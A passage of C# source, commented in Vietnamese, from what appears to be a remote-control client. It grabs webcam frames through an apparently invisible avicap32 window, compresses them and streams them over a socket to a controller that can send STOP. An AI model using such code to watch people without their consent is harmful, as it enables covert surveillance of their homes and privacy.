                        myEncoderParameters.Param[0] = myEncoderParameter;

                        bmp.Save(ms, jpgEncoder, myEncoderParameters);
                        byte[] buffer = ms.ToArray();

                        // 3. Gửi kích thước -> Gửi ảnh
                        lock (Program.client)
                        {
                            // 1. Gửi Header kích thước (Chuyển sang byte mảng để gửi trực tiếp qua Socket)
                            string header = buffer.Length.ToString() + "\n";
                            byte[] headerBytes = Encoding.ASCII.GetBytes(header);
                            Program.client.Send(headerBytes);

                            // 2. Gửi Dữ liệu ảnh
                            Program.client.Send(buffer);
                        }

                        // Dọn dẹp
                        ms.Close();
                        g.Dispose();
                        bmp.Dispose();

                        // 4. Kiểm tra lệnh STOP (Non-blocking)
                        if (Program.ns.DataAvailable) 
                        {
                            string cmd = Program.nr.ReadLine();
                            if (cmd == "STOP")
                            {
                                isRecording = false;
                                Program.nw.WriteLine("STOPPED"); 
                                Program.nw.Flush();
                            }
                        }

                        // 5. Kiểm tra timeout
                        if (DateTime.Now > stopTime)
                        {
                            isRecording = false;
                            Program.nw.WriteLine("TIMEOUT");
                            Program.nw.Flush();
                        }
                        
                        Thread.Sleep(25);
                    }
                    catch (Exception ex) 
                    { 
                        isRecording = false; 
                    }
                }
            }
        }

        // Hàm phụ trợ lấy Codec nén ảnh (Bắt buộc phải có)
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid) return codec;
            }
            return null;
        }

        
    }

    public class Webcam
    {
        [DllImport("user32.dll")] static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
        [DllImport("avicap32.dll")] static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);
        [DllImport("user32.dll")] static extern bool DestroyWindow(IntPtr hWnd);

        private IntPtr hWebcam;
        
        public Webcam(int width, int height) {
            hWebcam = capCreateCaptureWindowA("Webcam", 0, 0, 0, width, height, 0, 0);
        }
        
        public void Start() { 
            SendMessage(hWebcam, 1034, 0, 0); // CONNECT
        } 
        
        public void Stop() { 
            SendMessage(hWebcam, 1035, 0, 0); // DISCONNECT
            DestroyWindow(hWebcam); 
        }
        
        public Bitmap Capture() 
        {
            // 1. Ra lệnh chụp và copy vào Clipboard
            SendMessage(hWebcam, 1084, 0, 0); // GRAB_FRAME
            SendMessage(hWebcam, 1054, 0, 0); // EDIT_COPY

            // 2. Thử lấy ảnh từ Clipboard (Thử tối đa 10 lần)
            for (int i = 0; i < 10; i++)
            {
                try
                {
                    IDataObject data = Clipboard.GetDataObject();
                    if (data != null && data.GetDataPresent(DataFormats.Bitmap))
                    {
                        // Lấy được ảnh -> Trả về ngay
                        return (Bitmap)data.GetData(DataFormats.Bitmap);
                    }
                }
                catch 
                { 
                    // Clipboard đang bận -> Bỏ qua, đợi tí thử lại
                }
                
                // Nghỉ 20ms để Windows kịp xử lý
                System.Threading.Thread.Sleep(20);
            }

            // Nếu thử 10 lần (tổng 200ms) mà vẫn không được thì mới trả về null
            return null;
        }
    }
}
